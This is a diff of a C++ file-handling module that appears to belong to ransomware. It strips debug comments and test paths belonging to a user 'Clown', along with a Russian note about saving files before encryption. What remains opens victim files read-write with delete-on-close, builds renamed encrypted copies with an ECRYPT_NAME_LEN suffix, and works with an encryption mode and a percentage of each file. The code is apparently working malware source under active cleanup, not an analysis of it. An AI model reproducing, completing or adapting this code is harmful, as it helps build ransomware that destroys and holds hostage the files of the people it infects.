@@ -66,17 +66,7 @@ namespace filesystem
 			'*',
 			'?',
 			'\"',
-			'|'		
-			/*39,
-			93,
-			47,
-			58,
-			42,
-			63,
-			62,
-			60,
-			124,
-			34*/
+			'|'					
 		};		
 		
 		int Count = sizeof(BlackListSmb) / sizeof(const char);
@@ -175,13 +165,7 @@ namespace filesystem
 			wmemcpy_s(&mke[FileInfo->fullpahtSize - FileInfo->nameSize - 1], fl_len, wname, fl_len);
 			mke[FileInfo->fullpahtSize - ECRYPT_NAME_LEN] = '\0';
 		}
-				
-		/*try
-		{
-			boost::filesystem::copy_file(wargv, mke);
-			boost::filesystem::remove(wargv_rmv);
-		}catch (std::exception& ex) { std::cout << "EXC\t" << ex.what() << std::endl; }		
-		*/
+						
 		
 		memory::m_delete(wargv);
 		memory::m_delete(wpath);
@@ -234,9 +218,7 @@ namespace filesystem
 		__in filesystem::LPFILE_INFO FileInfo
 	)
 	{
-		WCHAR* FilePath = memory::m_wchar(FileInfo->fullpaht, FileInfo->fullpahtSize);
-
-		//HANDLE hFile = pCreateFileW(FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+		WCHAR* FilePath = memory::m_wchar(FileInfo->fullpaht, FileInfo->fullpahtSize);	
 		HANDLE hFile = pCreateFileW(FilePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
 		if (hFile == INVALID_HANDLE_VALUE)
 		{
@@ -684,13 +666,11 @@ END:
 			if (!ReadFile(FileInfo))
 			{
 				printf_s("Failed %s to ReadFile. GetLastError = %lu.\n", fullpaht, pGetLastError());
-				return FALSE; //Примечание: чтобы прочитать кириллицу, нужно перед шифрованием сохранить файл в кодировке ANSI
+				return FALSE; 
 			}
 			return TRUE;
 		}
-		WCHAR* mke = MakeCopyFile(FileInfo);
-		//WCHAR* mke = (WCHAR*)memory::m_new(36);
-		//wmemcpy_s(mke, 36,L"C:\\Users\\Clown\\Desktop\\asd\\asd2.txt", 36);
+		WCHAR* mke = MakeCopyFile(FileInfo);		
 		if (!getParseFile(FileInfo))
 		{
 			printf_s("Failed %s to ParseFile. GetLastError = %lu.\n", fullpaht, pGetLastError());
@@ -726,13 +706,3 @@ END:
 		return TRUE;
 	}
 }
-
-		//C:\Users\Clown\Desktop\asd\videoplayback-11111.mp4 argv
-		//C:\Users\Clown\Desktop\asd					     path
-
-/*
-std::cout << FileInfo->FileSize << std::endl;
-		std::cout << "ENCMODE: " << global::GetEncryptMode() << std::endl;
-		std::cout << "Percent: " << global::GetPercent() << std::endl;
-		std::cout << "Percent: " << (int)global::GetPercent() << std::endl;
-*/
